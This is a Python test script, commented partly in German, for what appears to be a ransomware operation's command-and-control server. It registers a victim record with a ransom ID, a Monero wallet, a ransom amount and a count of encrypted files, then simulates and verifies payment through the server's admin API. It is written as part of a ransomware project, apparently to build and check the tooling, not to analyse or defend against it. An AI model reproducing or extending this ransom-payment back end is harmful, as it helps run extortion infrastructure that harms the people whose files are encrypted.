#!/usr/bin/env python3
"""
Complete Payment Flow Test
===========================
Registriert Victim → Simuliert Payment → Verifiziert Status
"""

import urllib.request
import json
import sys
import time

def complete_payment_flow(ransom_id, monero_wallet, c2_host='127.0.0.1', c2_port=5000):
    """Kompletter Payment-Flow"""
    
    c2_url = f"http://{c2_host}:{c2_port}"
    
    print("\n" + "="*70)
    print("COMPLETE PAYMENT FLOW TEST")
    print("="*70)
    print(f"[*] Ransom ID: {ransom_id}")
    print(f"[*] C2 Server: {c2_url}")
    print("="*70 + "\n")
    
    # Step 1: Registriere Victim
    print("[*] Step 1: Registering victim...")
    try:
        register_url = f"{c2_url}/api/v1/register"
        register_data = {
            'ransom_id': ransom_id,
            'monero_address': monero_wallet,
            'ransom_amount_xmr': 0.1,
            'system_info': {
                'hostname': 'TEST-HOST',
                'username': 'TestUser',
                'os_info': 'Windows Test',
                'files_encrypted': 42,
                'data_size_gb': 1.5
            }
        }
        
        req = urllib.request.Request(
            register_url,
            data=json.dumps(register_data).encode('utf-8'),
            method='POST',
            headers={'Content-Type': 'application/json'}
        )
        
        with urllib.request.urlopen(req, timeout=5) as r:
            reg_result = json.load(r)
            print(f"[+] Registered: {reg_result}")
            print(f"    Ransom ID: {reg_result.get('ransom_id')}")
            print(f"    Amount: {reg_result.get('amount_xmr')} XMR")
    except Exception as e:
        print(f"[!] Registration failed: {e}")
        return False
    
    time.sleep(2)
    
    # Step 2: Prüfe Payment-Status (vor Payment)
    print("\n[*] Step 2: Checking payment status (BEFORE payment)...")
    try:
        status_url = f"{c2_url}/api/v1/payment/status/{ransom_id}"
        with urllib.request.urlopen(status_url, timeout=5) as r:
            status = json.load(r)
            print(f"[+] Status: {status}")
            print(f"    Paid: {status.get('paid')}")
            print(f"    Status: {status.get('status')}")
    except Exception as e:
        print(f"[!] Error checking status: {e}")
        return False
    
    time.sleep(2)
    
    # Step 3: Simuliere Payment
    print("\n[*] Step 3: Simulating payment...")
    try:
        pay_url = f"{c2_url}/api/v1/admin/pay/{ransom_id}"
        req = urllib.request.Request(pay_url, data=b'', method='POST')
        with urllib.request.urlopen(req, timeout=5) as r:
            pay_result = json.load(r)
            print(f"[+] Payment result: {pay_result}")
    except Exception as e:
        print(f"[!] Error simulating payment: {e}")
        return False
    
    time.sleep(2)
    
    # Step 4: Verifiziere Payment (nach Payment)
    print("\n[*] Step 4: Verifying payment (AFTER payment)...")
    try:
        with urllib.request.urlopen(status_url, timeout=5) as r:
            new_status = json.load(r)
            print(f"[+] New Status: {new_status}")
            print(f"    Paid: {new_status.get('paid')}")
            print(f"    Status: {new_status.get('status')}")
            
            if new_status.get('paid'):
                print("\n" + "="*70)
                print("[✓✓✓] PAYMENT VERIFIED!")
                print("[✓✓✓] GUI should now show 'PAYMENT RECEIVED!'")
                print("="*70 + "\n")
                return True
            else:
                print("\n[!] Payment NOT verified!")
                return False
    except Exception as e:
        print(f"[!] Error verifying payment: {e}")
        return False

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("[!] Usage: python complete_payment_flow.py <ransom_id> <monero_wallet> [c2_host] [c2_port]")
        print("\nExample:")
        print("  python complete_payment_flow.py Test1 4BJV39ZuKU...")
        print("  python complete_payment_flow.py Test1 4BJV39ZuKU... 192.168.1.100 5000")
        sys.exit(1)
    
    ransom_id = sys.argv[1]
    monero_wallet = sys.argv[2]
    c2_host = sys.argv[3] if len(sys.argv) > 3 else '127.0.0.1'
    c2_port = int(sys.argv[4]) if len(sys.argv) > 4 else 5000
    
    success = complete_payment_flow(ransom_id, monero_wallet, c2_host, c2_port)
    sys.exit(0 if success else 1)
